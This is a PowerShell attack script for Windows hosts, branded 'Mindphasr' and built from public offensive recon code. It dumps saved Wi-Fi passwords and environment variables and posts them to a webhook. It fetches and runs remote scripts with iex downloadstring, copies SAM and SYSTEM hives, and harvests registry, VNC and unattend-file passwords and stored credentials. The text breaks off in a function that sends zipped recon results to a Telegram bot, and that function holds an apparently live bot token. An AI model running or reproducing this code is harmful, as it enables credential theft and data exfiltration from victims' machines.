

$a=@()
$b=@()
dir env: >> stats.txt
$Global:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"

Function Get-NetworkInfos{
    netsh wlan show profiles |%{if(($_.split(':')[1]) -eq $null){} else{$a +=(($_.split(':')[1]) -Replace "^.","")}}
    foreach ($row in $a){
        $b=(netsh wlan show profile $row key=clear)
        add-content -path ".\stats.txt" -value $b}
    $Body=@{ content = "$env:computername Stats from Mindphasr"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url
    Remove-Item '.\stats.txt'
}

Function Get-Installedsoftware {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(ValueFromPipeline              =$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0
        )]
        [string[]]
            $ComputerName = $env:COMPUTERNAME,
        [Parameter(Position=0)]
        [string[]]
            $Property,
        [string[]]
            $IncludeProgram,
        [string[]]
            $ExcludeProgram,
        [switch]
            $ProgramRegExMatch,
        [switch]
            $LastAccessTime,
        [switch]
            $ExcludeSimilar,
        [int]
            $SimilarWord
    )

    begin {
        $RegistryLocation = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\',
                            'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\'

        if ($psversiontable.psversion.major -gt 2) {
            $HashProperty = [ordered]@{}    
        } else {
            $HashProperty = @{}
            $SelectProperty = @('ComputerName','ProgramName')
            if ($Property) {
                $SelectProperty += $Property
            }
            if ($LastAccessTime) {
                $SelectProperty += 'LastAccessTime'
            }
        }
    }

    process {
        foreach ($Computer in $ComputerName) {
            try {
                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
                if ($socket.Connected) {
                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)
                    $RegistryLocation | ForEach-Object {
                        $CurrentReg = $_
                        if ($RegBase) {
                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
                            if ($CurrentRegKey) {
                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {
                                    $HashProperty.ComputerName = $Computer
                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('DisplayName'))
                                    
                                    if ($IncludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notmatch $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notlike $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($ExcludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -match $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -like $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($DisplayName) {
                                        if ($Property) {
                                            foreach ($CurrentProperty in $Property) {
                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue($CurrentProperty)
                                            }
                                        }
                                        if ($LastAccessTime) {
                                            $InstallPath = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('InstallLocation') -replace '\\$',''
                                            if ($InstallPath) {
                                                $WmiSplat = @{
                                                    ComputerName = $Computer
                                                    Query        = $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
                                                    ErrorAction  = 'SilentlyContinue'
                                                }
                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |
                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |
                                                    Sort-Object -Property LastAccessed |
                                                    Select-Object -Last 1 | ForEach-Object {
                                                        $_.ConvertToDateTime($_.LastAccessed)
                                                    }
                                            } else {
                                                $HashProperty.LastAccessTime = $null
                                            }
                                        }
                                        
                                        if ($psversiontable.psversion.major -gt 2) {
                                            [pscustomobject]$HashProperty
                                        } else {
                                            New-Object -TypeName PSCustomObject -Property $HashProperty |
                                            Select-Object -Property $SelectProperty
                                        }
                                    }
                                    $socket.Close()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error $_
            }
        }
    }
}

function Generalrecon{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $global:currentPath = (Get-Item -Path ".\" -Verbose).FullName

    Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
    #Check for WSUS Updates over HTTP
  Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
    $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer

    if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
  {
        Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
      if(!$consoleoutput){echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$global:currentPath\Vulnerabilities\WsusoverHTTP.txt"}else{echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer "}
    }

    #Check for SMB Signing
    Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
    iex (new-object net.webclient).downloadstring($Global:S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
    if(!$consoleoutput){Invoke-SMBNegotiate -ComputerName localhost >> "$global:currentPath\Vulnerabilities\SMBSigningState.txt"}else{Write-Host -ForegroundColor red "SMB Signing State: ";Invoke-SMBNegotiate -ComputerName localhost}


    #Check .NET Framework versions in use
    $Lookup = @{
    378389 = [version]'4.5'
    378675 = [version]'4.5.1'
    378758 = [version]'4.5.1'
    379893 = [version]'4.5.2'
    393295 = [version]'4.6'
    393297 = [version]'4.6'
    394254 = [version]'4.6.1'
    394271 = [version]'4.6.1'
    394802 = [version]'4.6.2'
    394806 = [version]'4.6.2'
    460798 = [version]'4.7'
    460805 = [version]'4.7'
    461308 = [version]'4.7.1'
    461310 = [version]'4.7.1'
    461808 = [version]'4.7.2'
    461814 = [version]'4.7.2'
    528040 = [version]'4.8'
    528049 = [version]'4.8'
    }

    $Versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
  Get-ItemProperty -name Version, Release -EA 0 |
  Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
  Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}}, 
  @{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
    
    if(!$consoleoutput)
    {
        $Versions >> "$global:currentPath\LocalRecon\NetFrameworkVersionsInstalled.txt"
    }
    else
    {
        $Versions
    }

    #Collecting usefull Informations
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
        systeminfo >> "$global:currentPath\LocalRecon\systeminfo.txt"
        Write-Host -ForegroundColor Yellow 'Getting Patches'
      wmic qfe >> "$global:currentPath\LocalRecon\Patches.txt"
        wmic os get osarchitecture >> "$global:currentPath\LocalRecon\Architecture.txt"
      Write-Host -ForegroundColor Yellow 'Getting environment variables'
        Get-ChildItem Env: | ft Key,Value >> "$global:currentPath\LocalRecon\Environmentvariables.txt"
      Write-Host -ForegroundColor Yellow 'Getting connected drives'
        Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root >> "$global:currentPath\LocalRecon\Drives.txt"
        Write-Host -ForegroundColor Yellow 'Getting current user Privileges'
      whoami /priv >> "$global:currentPath\LocalRecon\Privileges.txt"
        Get-LocalUser | ft Name,Enabled,LastLogon >> "$global:currentPath\LocalRecon\LocalUsers.txt"
        Write-Host -ForegroundColor Yellow 'Getting local Accounts/Users + Password policy'
      net accounts >>  "$global:currentPath\LocalRecon\PasswordPolicy.txt"
        Get-LocalGroup | ft Name >> "$global:currentPath\LocalRecon\LocalGroups.txt"
      Write-Host -ForegroundColor Yellow 'Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address >> "$global:currentPath\LocalRecon\Networkinterfaces.txt"
        Get-DnsClientServerAddress -AddressFamily IPv4 | ft >> "$global:currentPath\LocalRecon\DNSServers.txt"
        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$global:currentPath\LocalRecon\NetRoutes.txt"
        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$global:currentPath\LocalRecon\ArpTable.txt"
        netstat -ano >> "$global:currentPath\LocalRecon\ActiveConnections.txt"
        Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release >> "$global:currentPath\LocalRecon\InstalledDotNetVersions"
        Write-Host -ForegroundColor Yellow 'Getting Shares'
      net share >> "$global:currentPath\LocalRecon\Networkshares.txt"
      Write-Host -ForegroundColor Yellow 'Getting hosts file content'
      get-content $env:windir\System32\drivers\etc\hosts | out-string  >> "$global:currentPath\LocalRecon\etc_Hosts_Content.txt"
      Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ >> "$global:currentPath\LocalRecon\Test_for_Argument_Injection.txt"
  }
    else
    {
        Write-Host -ForegroundColor Yellow '--------------> Collecting local system Informations for later lookup, saving them to .\LocalRecon\ ---------->'
        systeminfo 
        Write-Host -ForegroundColor Yellow '-------> Getting Patches'
      wmic qfe 
        wmic os get osarchitecture 
      Write-Host -ForegroundColor Yellow '-------> Getting environment variables'
        Get-ChildItem Env: | ft Key,Value 
      Write-Host -ForegroundColor Yellow '-------> Getting connected drives'
        Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root 
        Write-Host -ForegroundColor Yellow '-------> Getting current user Privileges'
      whoami /priv 
        Write-Host -ForegroundColor Yellow '-------> Getting local user account information'
        Get-LocalUser | ft Name,Enabled,LastLogon
        Write-Host -ForegroundColor Yellow '-------> Getting local Accounts/Users + Password policy'
      net accounts
        Get-LocalGroup | ft Name
      Write-Host -ForegroundColor Yellow '-------> Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
        Get-DnsClientServerAddress -AddressFamily IPv4 | ft 
        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex 
        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State 
        netstat -ano 
        Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release 
        Write-Host -ForegroundColor Yellow '-------> Getting Shares'
      net share
      Write-Host -ForegroundColor Yellow '-------> Getting hosts file content'
      get-content $env:windir\System32\drivers\etc\hosts | out-string 
      Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ 
    }
    #Stolen and integrated from 411Hall's JAWS
  Write-Host -ForegroundColor Yellow 'Searching for files with Full Control and Modify Access'
  Function Get-FireWallRule
          {
        Param ($Name, $Direction, $Enabled, $Protocol, $profile, $action, $grouping)
        $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
        If ($name)      {$rules= $rules | where-object {$_.name     -like $name}}
        If ($direction) {$rules= $rules | where-object {$_.direction  -eq $direction}}
        If ($Enabled)   {$rules= $rules | where-object {$_.Enabled    -eq $Enabled}}
        If ($protocol)  {$rules= $rules | where-object {$_.protocol   -eq $protocol}}
        If ($profile)   {$rules= $rules | where-object {$_.Profiles -bAND $profile}}
        If ($Action)    {$rules= $rules | where-object {$_.Action     -eq $Action}}
        If ($Grouping)  {$rules= $rules | where-object {$_.Grouping -like $Grouping}}
        $rules
      }
	    
      if(!$consoleoutput){Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> "$global:currentPath\LocalRecon\Firewall_Rules.txt"}else{Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096} 
	    
      $output = " Files with Full Control and Modify Access`r`n"
      $output = $output +  "-----------------------------------------------------------`r`n"
          $files = get-childitem C:\
          foreach ($file in $files)
          {
              try {
                  $output = $output +  (get-childitem "C:\$file" -include *.ps1,*.bat,*.com,*.vbs,*.txt,*.html,*.conf,*.rdp,.*inf,*.ini -recurse -EA SilentlyContinue | get-acl -EA SilentlyContinue | select path -expand access | 
                  where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|EVERYONE|CREATOR OWNER|NT SERVICE"} | where {$_.filesystemrights -match "FullControl|Modify"} | 
                  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
                  }
                  catch{$output = $output +   "`nFailed to read more files`r`n"}
            }
      Write-Host -ForegroundColor Yellow 'Searching for folders with Full Control and Modify Access'
      $output = $output +  "-----------------------------------------------------------`r`n"
          $output = $output +  " Folders with Full Control and Modify Access`r`n"
          $output = $output +  "-----------------------------------------------------------`r`n"
          $folders = get-childitem C:\
          foreach ($folder in $folders)
          {
              try 
            {
                $output = $output +  (Get-ChildItem -Recurse "C:\$folder" -EA SilentlyContinue | ?{ $_.PSIsContainer} | get-acl  | select path -expand access |  
                where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|CREATOR OWNER|NT SERVICE"}  | where {$_.filesystemrights -match "FullControl|Modify"} | 
                select path,filesystemrights,IdentityReference |  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
              }
            catch 
          {
              $output = $output +  "`nFailed to read more folders`r`n"
            }
            }
      if(!$consoleoutput){$output >> "$global:currentPath\LocalRecon\Files_and_Folders_with_Full_Modify_Access.txt"}else{Write-Host "------->JAWS Recon";$output}
	    
   Write-Host -ForegroundColor Yellow '-------> Checking for potential sensitive user files'
   if(!$consoleoutput){get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string >> "$global:currentPath\LocalRecon\Potential_Sensitive_User_Files.txt"}else{get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string} 
	 
   Write-Host -ForegroundColor Yellow '-------> Checking AlwaysInstallElevated'
   $HKLM = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
     $HKCU =  "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
     if (($HKLM | test-path) -eq "True") 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
            if(!$consoleoutput){echo "AlwaysInstallElevated enabled on this host!" >> "$global:currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"}else{Write-Host -ForegroundColor Red "AlwaysInstallElevated enabled on this host!"}
         }
     }
     if (($HKCU | test-path) -eq "True") 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
            if(!$consoleoutput){echo "AlwaysInstallElevated enabled on this host!" >> "$global:currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"}else{Write-Host -ForegroundColor Red "AlwaysInstallElevated enabled on this host!"}
         }
     }
   Write-Host -ForegroundColor Yellow '-------> Checking if Netbios is active'
   $EnabledNics= @(gwmi -query "select * from win32_networkadapterconfiguration where IPEnabled='true'")

   $OutputObj = @()
         foreach ($Network in $EnabledNics) 
       {
        If($network.tcpipnetbiosoptions) 
        {	
          $netbiosEnabled = [bool]$network
         if ($netbiosEnabled){Write-Host 'Netbios is active, vulnerability found.'; echo "Netbios Active, check localrecon folder for network interface Info" >> "$global:currentPath\Vulnerabilities\NetbiosActive.txt"}
        }
        $nic = gwmi win32_networkadapter | where {$_.index -match $network.index}
        $OutputObj  += @{
      Nic = $nic.netconnectionid
      NetBiosEnabled = $netbiosEnabled
    }
   }
   $out = $OutputObj | % { new-object PSObject -Property $_} | select Nic, NetBiosEnabled| ft -auto
   if(!$consoleoutput){$out >> "$global:currentPath\LocalRecon\NetbiosInterfaceInfo.txt"}else{$out}
	    
   Write-Host -ForegroundColor Yellow '-------> Checking if IPv6 is active (mitm6 attacks)'
   $IPV6 = $false
   $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter "ipenabled = TRUE").IPAddress
   foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains(":")}
   if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC" >> "$global:currentPath\Vulnerabilities\IPv6_Enabled.txt" }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC"}}
	 
   Write-Host -ForegroundColor Yellow '-------> Collecting installed Software informations'
   if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> "$global:currentPath\LocalRecon\InstalledSoftwareAll.txt"}else{Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096}
         
   iex (new-object net.webclient).downloadstring($Global:S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
   Write-Host -ForegroundColor Yellow '-------> Checking if Software is outdated and therefore vulnerable / exploitable'
   if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> "$global:currentPath\Vulnerabilities\VulnerableSoftware.txt"}else{Invoke-Vulmap | out-string -Width 4096}
        
            
     # Collecting more information
     Write-Host -ForegroundColor Yellow '-------> Checking for accesible SAM/SYS Files'
     if(!$consoleoutput){
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$global:currentPath\LocalRecon\SNMP.txt"}            
        If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$global:currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$global:currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$global:currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$global:currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$global:currentPath\Vulnerabilities\SYS"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$global:currentPath\Vulnerabilities\SYS"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$global:currentPath\Vulnerabilities\SYS"}
     }
     else
     {
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$global:currentPath\LocalRecon\SNMP.txt"}            
        If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\repair\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\RegBack\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\repair\system, looking for SAM?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\System32\config\SYSTEM, looking for SAM?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\System32\config\RegBack\system, looking for SAM?"} 
     }
     Write-Host -ForegroundColor Yellow '-------> Checking Registry for potential passwords'
     if(!$consoleoutput){
     REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$global:currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
     REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$global:currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
     }
     else
     {
        REG QUERY HKLM /F "passwor" /t REG_SZ /S /K
        REG QUERY HKCU /F "password" /t REG_SZ /S /K
     }
     Write-Host -ForegroundColor Yellow '-------> Checking sensitive registry entries..'
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
   {
    if(!$consoleoutput){reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$global:currentPath\LocalRecon\Winlogon.txt"}else{reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"}
   }
     
     if(!$consoleoutput){
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$global:currentPath\LocalRecon\SNMPParameters.txt"}
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$global:currentPath\Vulnerabilities\PuttySessions.txt"}
     If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$global:currentPath\Vulnerabilities\VNCPassword.txt"}
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$global:currentPath\Vulnerabilities\RealVNCPassword.txt"}

     If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$global:currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$global:currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$global:currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$global:currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$global:currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     }
     else
     {
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"}
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"}
        If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password"}
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password}

        If (Test-Path -Path C:\unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\Panther\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend\Unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\system32\sysprep.inf){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep.inf, check it for passwords'}
        If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep\sysprep.xml, check it for passwords'}
     }
     
     if(!$consoleoutput){Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$global:currentPath\Vulnerabilities\webconfigfiles.txt"}else{Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue}
	    
   Write-Host -ForegroundColor Yellow '-------> List running tasks'
     if(!$consoleoutput){Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$global:currentPath\LocalRecon\RunningTasks.txt"}else{Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize}

     Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'
     if(!$consoleoutput){cmdkey /list >> "$global:currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
}

function pathCheck
{
  <#
        .DESCRIPTION
        Checks for correct path dependencies.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Dependency Check
        $global:currentPath = (Get-Item -Path ".\" -Verbose).FullName                
        Write-Host -ForegroundColor Yellow 'Creating/Checking Log Folders in '$global:currentPath' directory:'
        
        if(!(Test-Path -Path $global:currentPath\LocalRecon\)){mkdir $global:currentPath\LocalRecon\}
        if(!(Test-Path -Path $global:currentPath\DomainRecon\)){mkdir $global:currentPath\DomainRecon\;mkdir $global:currentPath\DomainRecon\ADrecon}
        if(!(Test-Path -Path $global:currentPath\LocalPrivEsc\)){mkdir $global:currentPath\LocalPrivEsc\}
        if(!(Test-Path -Path $global:currentPath\Exploitation\)){mkdir $global:currentPath\Exploitation\}
        if(!(Test-Path -Path $global:currentPath\Vulnerabilities\)){mkdir $global:currentPath\Vulnerabilities\}
        if(!(Test-Path -Path $global:currentPath\LocalPrivEsc\)){mkdir $global:currentPath\LocalPrivEsc\}

}

#Exfiltration
function SendToDiscord{
<#
    Compress-Archive -f -Path $global:currentPath\LocalRecon\ -DestinationPath $global:currentPath\LocalRecon.zip

    $fileBytes = [System.IO.File]::ReadAllBytes("$global:currentPath\localRecon.zip");
    $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);

    $payload = @{
        chat_id              = '-776077305'
        document             = $fileEnc #"$global:currentPath\localRecon.zip"
        caption              = 'Send by Mindphasr'
    }
    
    $payload.document

    $invokeRestMethodSplat = @{
        Uri         = ("https://api.telegram.org/bot5327037211:AAE4Ju1kUydrmNGie_bCfHjrAxi1EmCoZWU/sendDocument")
        Body        = (ConvertTo-Json -Compress -InputObject $payload)
